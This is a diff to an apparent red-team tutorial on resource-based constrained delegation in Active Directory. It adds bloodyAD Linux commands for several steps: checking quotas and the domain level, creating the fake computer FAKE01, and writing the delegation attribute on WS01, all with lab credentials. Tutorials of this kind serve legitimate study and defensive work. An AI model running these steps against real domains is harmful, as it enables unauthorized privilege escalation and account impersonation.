@@ -40,6 +40,12 @@ Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 
 ![](<../../.gitbook/assets/Screenshot from 2019-03-26 20-49-58.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u john.doe -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get object john.doe --attr msDS-QuotaEffective,msDS-QuotaUsed
+```
+
 The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:
 
 ```csharp
@@ -47,6 +53,12 @@ Get-DomainController
 ```
 
 ![](<../../.gitbook/assets/Screenshot from 2019-03-26 20-56-15.png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD), the `domainControllerFunctionality` attribute must be 5 or above:
+
+```csharp
+bloodyAD -u john.doe -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get object ''
+```
 
 Last thing to check - the target computer `WS01` object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:
 
@@ -60,6 +72,12 @@ This is the attribute the above command is referring to:
 
 ![](<../../.gitbook/assets/Screenshot from 2019-03-26 21-08-47.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u john.doe -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get object 'ws01$' --attr sAMAccountName,msds-allowedtoactonbehalfofotheridentity
+```
+
 ## Creating a new Computer Object
 
 Let's now create a new computer object for our computer `FAKE01` (as referenced earlier in the requirements table) - this is the computer that will be trusted by our target computer `WS01` later on:
@@ -70,6 +88,12 @@ New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '12
 ```
 
 ![](<../../.gitbook/assets/Screenshot from 2019-03-26 21-30-46.png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u john.doe -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add computer FAKE01 123456
+```
 
 Checking if the computer got created and noting its SID:
 
@@ -100,6 +124,12 @@ Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofot
 
 ![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-38-54.png>)
 
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u john.doe -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add rbcd 'ws01$' 'fake01$'
+```
+
 Reminder - we were able to write this because `offense\Sandy` belongs to security group `offense\Operations`, which has full control over the target computer `WS01$` although the only important one/enough is the `WRITE` privilege:
 
 
@@ -121,6 +151,12 @@ Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
 ```
 
 ![](<../../.gitbook/assets/Screenshot from 2019-03-26 22-41-34.png>)
+
+Linux alternative with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
+
+```csharp
+bloodyAD -u john.doe -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get object 'ws01$' --attr sAMAccountName,msds-allowedtoactonbehalfofotheridentity
+```
 
 We can test if the security descriptor assigned to computer `ws01` in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the `fake01$` machine:
 
